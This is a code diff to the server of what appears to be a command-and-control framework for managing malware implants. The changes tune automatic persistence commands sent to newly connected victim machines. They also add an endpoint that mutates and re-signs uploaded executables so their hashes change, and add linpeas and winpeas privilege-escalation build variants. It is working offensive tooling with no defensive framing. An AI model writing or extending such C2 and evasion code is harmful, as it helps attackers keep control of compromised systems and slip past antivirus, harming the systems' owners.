@@ -46,6 +46,8 @@ const { SocksManager } = require('./socks5');
 const socksManager = new SocksManager();
 /** hostname|mac ? { sleep, jitter } so sleep survives session delete/reconnect */
 const beaconSleepPrefs = new Map();
+/** hostname|mac already received auto setpersistence this server process */
+const autoPersistHosts = new Set();
 
 const app = express();
 const server = http.createServer(app);
@@ -78,6 +80,11 @@ const upload = multer({
   limits: { fileSize: 100 * 1024 * 1024 } // 100MB limit
 });
 
+const mutateUpload = multer({
+  dest: path.join('uploads', 'mutate'),
+  limits: { fileSize: 100 * 1024 * 1024 },
+});
+
 // Global variables
 const clients = new Map();
 const clientSessions = new Map();
@@ -86,6 +93,7 @@ const outputBuffer = [];
 
 // Create uploads directory
 fs.ensureDirSync('uploads');
+fs.ensureDirSync(path.join('uploads', 'mutate'));
 fs.ensureDirSync('downloads');
 
 // ============================================================
@@ -1229,25 +1237,29 @@ function createTcpServer() {
         
         console.log(`[TCP] Client registered: ${clientInfo.hostname} (${clientInfo.username})`);
 
-        // Default on connect: set persistence (after brief handshake settle)
-        setTimeout(() => {
-          const live = clients.get(clientId);
-          if (!live || !live.socket || !live.active) return;
-          try {
-            live.socket.write(JSON.stringify({ type: 'command', content: 'setpersistence' }) + '\n');
-            const session = clientSessions.get(clientId) || [];
-            session.push({ timestamp: new Date(), type: 'command', content: 'setpersistence' });
-            clientSessions.set(clientId, session);
-            io.emit('commandSent', {
-              clientId,
-              command: 'setpersistence',
-              timestamp: new Date()
-            });
-            console.log(`[TCP] Auto command setpersistence -> ${clientInfo.hostname}`);
-          } catch (e) {
-            console.error('[TCP] Auto setpersistence failed:', e.message);
-          }
-        }, 800);
+        // Fallback: set persistence once per host|mac (dashboard usually sends via executeCommand)
+        const persistKey = `${String(clientInfo.hostname || '').toLowerCase()}|${String(clientInfo.macAddress || '').toLowerCase()}`;
+        if (!autoPersistHosts.has(persistKey)) {
+          autoPersistHosts.add(persistKey);
+          setTimeout(() => {
+            const live = clients.get(clientId);
+            if (!live || !live.socket || !live.active) return;
+            try {
+              live.socket.write(JSON.stringify({ type: 'command', content: 'setpersistence' }) + '\n');
+              const session = clientSessions.get(clientId) || [];
+              session.push({ timestamp: new Date(), type: 'command', content: 'setpersistence' });
+              clientSessions.set(clientId, session);
+              io.emit('commandSent', {
+                clientId,
+                command: 'setpersistence',
+                timestamp: new Date()
+              });
+              console.log(`[TCP] Auto command setpersistence -> ${clientInfo.hostname}`);
+            } catch (e) {
+              console.error('[TCP] Auto setpersistence failed:', e.message);
+            }
+          }, 1200);
+        }
 
         // Re-apply saved Cobalt-style sleep after reconnect (keyed by host+mac)
         setTimeout(() => {
@@ -2726,6 +2738,38 @@ app.get('/api/builder/signing/lab-cer', requireAuth, (req, res) => {
   }
 });
 
+app.post('/api/builder/mutate', requireAuth, mutateUpload.single('file'), async (req, res) => {
+  try {
+    if (!req.file || !req.file.path) {
+      return res.status(400).json({ error: 'Upload a .exe or .dll file' });
+    }
+    const body = req.body || {};
+    const signCode = body.signCode !== 'false' && body.signCode !== false;
+    console.log(`[MUTATE] Processing ${req.file.originalname} (${req.file.size} bytes)`);
+    const meta = await implantBuilder.mutateUploadedBinary({
+      inputPath: req.file.path,
+      originalName: req.file.originalname,
+      outputName: body.outputName ? String(body.outputName).trim() : undefined,
+      signCode,
+      signSubject: body.signSubject ? String(body.signSubject).trim() : undefined,
+      signAuto: body.signAuto !== 'false' && body.signAuto !== false,
+    });
+    try {
+      await fs.remove(req.file.path);
+    } catch (_) {}
+    console.log(`[MUTATE] Done ${meta.id} sha256=${meta.sha256.slice(0, 12)} (was ${meta.sourceSha256.slice(0, 12)})`);
+    res.json({ success: true, build: meta });
+  } catch (e) {
+    if (req.file && req.file.path) {
+      try {
+        await fs.remove(req.file.path);
+      } catch (_) {}
+    }
+    console.error('[MUTATE] Failed:', e.message);
+    res.status(500).json({ error: e.message || 'Mutate failed' });
+  }
+});
+
 app.post('/api/builder/generate', requireAuth, async (req, res) => {
   try {
     const body = req.body || {};
@@ -2741,6 +2785,8 @@ app.post('/api/builder/generate', requireAuth, async (req, res) => {
     ).trim();
     const variant = String(body.variant || 'implant').toLowerCase();
     const isDcom = platform === 'windows' && variant === 'dcom';
+    const isLinpeas = platform === 'linux' && variant === 'linpeas';
+    const isWinpeas = platform === 'windows' && variant === 'winpeas';
     const port = Number(
       body.port ||
       process.env.BUILD_C2_PORT ||
@@ -2748,11 +2794,11 @@ app.post('/api/builder/generate', requireAuth, async (req, res) => {
       settings.serverPort ||
       (appEnv === 'local' ? 2026 : 443)
     );
-    if (!host && !isDcom) {
+    if (!host && !isDcom && !isLinpeas && !isWinpeas) {
       return res.status(400).json({ error: 'C2 host is required' });
     }
     console.log(
-      `[BUILDER] Generating ${platform}/${arch}${isDcom ? '/dcom' : ''}${host ? ` -> ${host}:${port}` : ''}`
+      `[BUILDER] Generating ${platform}/${arch}${isDcom ? '/dcom' : ''}${isLinpeas ? '/linpeas' : ''}${isWinpeas ? '/winpeas' : ''}${host ? ` -> ${host}:${port}` : ''}`
     );
     const meta = await implantBuilder.generateBuild({
       platform,
